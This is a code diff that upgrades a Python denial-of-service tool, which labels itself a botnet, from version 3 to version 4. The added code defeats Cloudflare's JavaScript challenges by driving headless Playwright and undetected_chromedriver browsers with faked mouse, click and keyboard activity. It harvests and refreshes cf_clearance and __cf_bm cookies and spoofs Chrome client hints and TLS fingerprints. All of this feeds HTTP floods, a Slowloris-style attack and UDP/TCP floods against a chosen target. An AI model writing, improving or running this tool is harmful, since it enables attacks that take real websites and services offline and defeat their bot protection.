@@ -10,8 +10,9 @@ import hashlib
 import xxhash
 import h2.connection
 import h2.events
+import json
 from typing import List
-from playwright.sync_api import sync_playwright, Playwright
+from playwright.sync_api import sync_playwright
 import tls_client
 import undetected_chromedriver as uc
 import requests
@@ -21,10 +22,10 @@ from requests.cookies import RequestsCookieJar
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s - [%(levelname)s] %(message)s",
-    handlers=[logging.FileHandler("chaos_obliterator_v3.log"), logging.StreamHandler()]
+    handlers=[logging.FileHandler("chaos_obliterator_v4.log"), logging.StreamHandler()]
 )
 
-class ChaosObliteratorV3:
+class ChaosObliteratorV4:
     def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, threads: int = 30, methods: List[str] = None):
         self.target_l7 = target_l7.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] if target_l7 else None
         self.target_l4 = target_l4 if target_l4 else None
@@ -33,8 +34,8 @@ class ChaosObliteratorV3:
         self.methods = methods if methods else ["chaoshttp", "ghostloris", "udpchaos", "tcpobliterator"]
         self.end_time = time.time() + duration
         self.user_agents = [
-            f"Mozilla/5.0 (Windows NT {random.uniform(12.0, 18.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(80, 90)}",
-            f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16, 20)}_0 like Mac OS X) Safari/605.1.{random.randint(40, 50)}"
+            f"Mozilla/5.0 (Windows NT {random.uniform(12.0, 18.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(80, 90)} (KHTML, like Gecko) Chrome/{random.randint(120, 122)}.0.0.0 Safari/537.{random.randint(80, 90)}",
+            f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16, 20)}_0 like Mac OS X) AppleWebKit/605.1.{random.randint(40, 50)} (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
         ]
         self.success_count = {m: 0 for m in self.methods}
         self.response_times = {m: [] for m in ["chaoshttp", "ghostloris"]}
@@ -43,6 +44,7 @@ class ChaosObliteratorV3:
         self.jitter_factors = {i: 1.0 for i in range(self.threads)}  # Per-thread jitter
         self.cookies = RequestsCookieJar()  # Upgraded to RequestsCookieJar
         self.session_headers = {}  # Store headers from browser
+        self.cookie_file = "cookies.json"  # Store cookies for debugging
 
     def _random_payload(self, size: int = 512) -> bytes:
         """Upgraded polymorphic payload with larger size."""
@@ -71,40 +73,70 @@ class ChaosObliteratorV3:
             "X-Forwarded-For": self._random_ip(),
             "Accept": random.choice(["application/json", "text/event-stream", "*/*", "application/x-graphql"]),
             "Cache-Control": "no-cache, no-store, must-revalidate",
-            "Connection": "keep-alive"
+            "Connection": "keep-alive",
+            "Sec-Ch-Ua": f'"Google Chrome";v="{random.randint(120, 122)}", "Not;A=Brand";v="8", "Chromium";v="{random.randint(120, 122)}"',
+            "Sec-Ch-Ua-Mobile": "?0",
+            "Sec-Ch-Ua-Platform": '"Windows"'
         }
         headers.update(self.session_headers)  # Inject headers from browser
         if random.random() < 0.99:
             headers["X-Entropy-Nexus"] = ''.join(random.choices(string.hexdigits.lower(), k=60))
         return headers
 
+    def _save_cookies(self, cookies):
+        """Save cookies to file for debugging."""
+        with open(self.cookie_file, "w") as f:
+            json.dump(cookies, f, indent=2)
+        logging.info(f"Cookies saved to {self.cookie_file}")
+
     def _get_browser_session(self):
-        """Use headless browser to bypass JS challenges and get cookies with validation."""
+        """Use headless browser to bypass JS challenges with advanced emulation."""
         max_attempts = 3
         attempt = 0
+        viewports = [
+            {"width": 1920, "height": 1080},
+            {"width": 1366, "height": 768},
+            {"width": 1440, "height": 900}
+        ]
         while attempt < max_attempts:
             try:
                 with sync_playwright() as p:
                     browser = p.chromium.launch(headless=True)
                     context = browser.new_context(
                         user_agent=random.choice(self.user_agents),
-                        viewport={"width": 1920, "height": 1080}
+                        viewport=random.choice(viewports),
+                        java_script_enabled=True,
+                        ignore_https_errors=True
                     )
                     page = context.new_page()
                     
-                    # Emulate human behavior
-                    page.goto(f"https://{self.target_l7}", wait_until="domcontentloaded")
-                    time.sleep(random.uniform(1, 3))  # Simulate page load
+                    # Advanced human behavior emulation
+                    page.goto(f"https://{self.target_l7}", wait_until="domcontentloaded", timeout=30000)
+                    time.sleep(random.uniform(1, 3))
                     page.evaluate("window.scrollTo(0, document.body.scrollHeight)")  # Scroll
-                    time.sleep(random.uniform(0.5, 1.5))  # Random delay
-                    page.click("body")  # Random click
                     time.sleep(random.uniform(0.5, 1.5))
+                    page.mouse.move(random.randint(100, 800), random.randint(100, 600))  # Mouse movement
+                    time.sleep(random.uniform(0.3, 1))
+                    page.mouse.click(random.randint(100, 800), random.randint(100, 600))  # Random click
+                    time.sleep(random.uniform(0.5, 1.5))
+                    page.keyboard.press("Tab")  # Simulate tab key
+                    time.sleep(random.uniform(0.2, 0.8))
+                    
+                    # Check page status
+                    response = page.evaluate("() => document.readyState")
+                    if response != "complete":
+                        logging.warning(f"Attempt {attempt + 1}: Page not fully loaded.")
+                        attempt += 1
+                        browser.close()
+                        continue
                     
                     # Get cookies and validate
                     cookies = context.cookies()
                     cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
-                    if not cf_clearance:
-                        logging.warning(f"Attempt {attempt + 1}: No cf_clearance cookie, retrying...")
+                    cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
+                    if not (cf_clearance and cf_bm):
+                        logging.warning(f"Attempt {attempt + 1}: Missing cf_clearance or __cf_bm, retrying...")
+                        self._save_cookies(cookies)  # Save for debugging
                         attempt += 1
                         browser.close()
                         continue
@@ -120,6 +152,7 @@ class ChaosObliteratorV3:
                         "Sec-Fetch-Mode": "navigate",
                         "Sec-Fetch-Dest": "document"
                     }
+                    self._save_cookies(cookies)  # Save for debugging
                     browser.close()
                     logging.info("JS challenge passed, cookies obtained.")
                     return
@@ -132,21 +165,28 @@ class ChaosObliteratorV3:
         logging.error("Failed to get valid cookies after max attempts.")
 
     def _get_browser_session_fallback(self):
-        """Fallback to undetected_chromedriver if Playwright fails."""
+        """Fallback to undetected_chromedriver with advanced emulation."""
         try:
-            driver = uc.Chrome(headless=True, use_subprocess=False)
+            options = uc.ChromeOptions()
+            options.add_argument(f"--user-agent={random.choice(self.user_agents)}")
+            options.add_argument("--headless")
+            driver = uc.Chrome(options=options, headless=True, use_subprocess=False)
             driver.get(f"https://{self.target_l7}")
-            time.sleep(random.uniform(1, 3))  # Simulate page load
+            time.sleep(random.uniform(1, 3))
             driver.execute_script("window.scrollTo(0, document.body.scrollHeight)")  # Scroll
             time.sleep(random.uniform(0.5, 1.5))
-            driver.find_element_by_tag_name("body").click()  # Random click
-            time.sleep(random.uniform(0.5, 1.5))
+            driver.execute_script("document.elementFromPoint(500, 300).click()")  # Random click
+            time.sleep(random.uniform(0.3, 1))
+            driver.execute_script("window.focus()")  # Simulate focus
+            time.sleep(random.uniform(0.2, 0.8))
             
             # Get cookies and validate
             cookies = driver.get_cookies()
             cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
-            if not cf_clearance:
-                logging.error("Fallback: No cf_clearance cookie.")
+            cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
+            if not (cf_clearance and cf_bm):
+                logging.error("Fallback: Missing cf_clearance or __cf_bm.")
+                self._save_cookies(cookies)
                 driver.quit()
                 return
             
@@ -161,10 +201,37 @@ class ChaosObliteratorV3:
                 "Sec-Fetch-Mode": "navigate",
                 "Sec-Fetch-Dest": "document"
             }
+            self._save_cookies(cookies)
             driver.quit()
             logging.info("Fallback: JS challenge passed, cookies obtained.")
         except Exception as e:
             logging.error(f"Fallback failed: {e}")
+
+    def _check_environment(self):
+        """Check environment for dependencies."""
+        try:
+            import playwright
+            logging.info("Playwright detected.")
+        except ImportError:
+            logging.error("Playwright not installed. Run: pip3 install playwright")
+            return False
+        try:
+            os.system("playwright install chromium > /dev/null 2>&1")
+            logging.info("Chromium installed for Playwright.")
+        except:
+            logging.warning("Failed to install Chromium, fallback may be used.")
+        try:
+            import Xvfb
+            logging.info("Xvfb detected, GUI support available.")
+        except ImportError:
+            logging.warning("Xvfb not detected, may fail in non-GUI environments.")
+        return True
+
+    def _refresh_cookies(self):
+        """Refresh cookies every 30 seconds."""
+        while time.time() < self.end_time:
+            self._get_browser_session()
+            time.sleep(30)
 
     def _scan_ports(self):
         """Dynamic port scanning for L4 targets."""
@@ -197,7 +264,7 @@ class ChaosObliteratorV3:
         if not self.target_l7:
             return
         session = tls_client.Session(
-            client_identifier=f"chrome_{random.randint(100, 120)}",
+            client_identifier=f"chrome_{random.randint(120, 122)}",
             random_tls_extension_order=True
         )
         while time.time() < self.end_time:
@@ -247,7 +314,7 @@ class ChaosObliteratorV3:
         if not self.target_l7:
             return
         session = tls_client.Session(
-            client_identifier=f"chrome_{random.randint(100, 120)}",
+            client_identifier=f"chrome_{random.randint(120, 122)}",
             random_tls_extension_order=True
         )
         while time.time() < self.end_time:
@@ -261,7 +328,6 @@ class ChaosObliteratorV3:
                 headers.update(self.session_headers)
                 path = self._random_path()
                 url = f"https://{self.target_l7}{path}"
-                # Partial request to simulate Slowloris
                 session.get(url, headers=headers, timeout=0.08)  # Low timeout for slow drip
                 self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                 with self.lock:
@@ -311,12 +377,17 @@ class ChaosObliteratorV3:
         if not self.target_l7 and not self.target_l4:
             logging.error("At least one target (L7 or L4) required")
             return
-        logging.info(f"ChaosObliteratorV3 strike on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, methods: {self.methods}")
+        logging.info(f"ChaosObliteratorV4 strike on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, methods: {self.methods}")
         
-        # Start browser session for cookies and headers
+        # Check environment
+        if not self._check_environment():
+            logging.error("Environment check failed, exiting.")
+            return
+        
+        # Start cookie refresh thread
         if self.target_l7:
-            threading.Thread(target=self._get_browser_session, daemon=True).start()
-            time.sleep(5)  # Wait for browser session
+            threading.Thread(target=self._refresh_cookies, daemon=True).start()
+            time.sleep(5)  # Wait for initial cookies
         
         # Start port scanning for L4
         if self.target_l4:
@@ -345,11 +416,11 @@ class ChaosObliteratorV3:
 
 def main(target_l7: str, target_l4: str, duration: int, methods: str):
     methods = methods.split(",")
-    obliterator = ChaosObliteratorV3(target_l7, target_l4, duration, methods=methods)
+    obliterator = ChaosObliteratorV4(target_l7, target_l4, duration, methods=methods)
     obliterator.start()
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="ChaosObliteratorV3 Botnet")
+    parser = argparse.ArgumentParser(description="ChaosObliteratorV4 Botnet")
     parser.add_argument("target_l7", nargs="?", default=None, help="L7 target URL (e.g., http://httpbin.org)")
     parser.add_argument("target_l4", nargs="?", default=None, help="L4 target IP (e.g., 93.184.216.34)")
     parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
